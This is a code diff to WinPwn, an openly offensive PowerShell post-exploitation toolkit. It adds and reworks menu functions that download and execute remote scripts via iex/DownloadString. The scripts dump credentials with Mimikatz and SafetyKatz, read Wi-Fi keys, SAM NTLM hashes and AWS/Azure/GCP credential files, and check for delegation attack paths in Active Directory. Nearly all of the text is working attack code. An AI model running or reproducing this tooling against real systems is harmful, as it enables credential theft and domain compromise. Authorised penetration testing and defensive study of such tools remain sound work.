@@ -334,8 +334,9 @@ __        ___       ____
             Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
             Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
             Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
-	    Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only'
-	    Write-Host -ForegroundColor Green '10. Exit. '
+	    Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
+	    Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'	    
+	    Write-Host -ForegroundColor Green '11. Exit. '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -350,42 +351,71 @@ __        ___       ____
 		        7{kittenz}
 		        8{if(isadmin){wificreds}}
 		        9{if(isadmin){samfile}}
+			10{SharpCloud}
              }
         }
-        While ($masterquestion -ne 10)
+        While ($masterquestion -ne 11)
+}
+
+function SharpCloud
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpCloud.ps1')
+    Invoke-SharpCloud -Command all >> $currentPath\Exploitation\CloudCreds.txt
+    Get-Content $currentPath\Exploitation\CloudCreds.txt
+    pause;
 }
 
 function safedump
 {
-   	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-	Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
 }
     
 function obfuskittiedump
 {
-    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/mimi.ps1')
-	Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
-        Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/mimi.ps1')
+    Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
+    Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
+    Get-Content $currentPath\Exploitation\Credentials.txt
+    pause;
 }
 function wificreds
 {
-    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
-	Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
-	Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
+    Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
+    Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
+    Get-Content $currentPath\Exploitation\WIFI_Keys.txt
+    pause;
 }
     
 function kittenz
 {
-    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/obfuskittie.ps1')
-	Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
-	inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/obfuskittie.ps1')
+    Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
+    inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
+    Get-Content $currentPath\Exploitation\kittenz.txt
+    pause;
 }
     
 function samfile
 {
-    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
-    	Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
-	Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
+    Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
+    Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
+    Get-Content $currentPath\Exploitation\SAMDump.txt
+    pause;
 }
 
 function dumplsass
@@ -1302,7 +1332,10 @@ __        ___       ____
         Write-Host -ForegroundColor Green '13. Search for potential vulnerable web apps (low hanging fruits)! '
         Write-Host -ForegroundColor Green '14. Check remote system groups via GPO Mapping! '
         Write-Host -ForegroundColor Green '15. Search for Systems with Admin-Access to pwn them! '
-        Write-Host -ForegroundColor Green '16. Exit. '
+	Write-Host -ForegroundColor Green '16. Search for printers / potential vulns! '
+	Write-Host -ForegroundColor Green '17. Search for Resource-Based Constrained Delegation attack paths! '
+	Write-Host -ForegroundColor Green '18. Enumerate remote access policies through group policy! '
+        Write-Host -ForegroundColor Green '19. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1323,11 +1356,43 @@ __        ___       ____
              13{fruit}
              14{groupsearch}
              15{latmov}
+	     16{printercheck}
+	     17{RBCD-Check}
+	     18{GPORemoteAccessPolicy}
        }
     }
- While ($masterquestion -ne 16)
+ While ($masterquestion -ne 19)
 }
 
+function GPORemoteAccessPolicy
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpGPO-RemoteAccessPolicies.ps1')
+    Invoke-SharpGPO-RemoteAccessPolicies >> $currentPath\DomainRecon\GPO-RemoteAccess.txt
+    Get-Content $currentPath\DomainRecon\GPO-RemoteAccess.txt
+    pause;
+}
+function RBCD-Check
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Get-RBCD-Threaded.ps1')
+    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+    Invoke-Get-RBCD-Threaded -Command "-s -d $Domain" >> $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
+    Get-Content $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
+    pause;
+}
+
+function printercheck
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpPrinter.ps1')
+    Invoke-SharpPrinter >> $currentPath\DomainRecon\printercheck.txt
+    Get-Content $currentPath\DomainRecon\printercheck.txt
+    pause;
+}
 function GPOAudit
 {
 <#
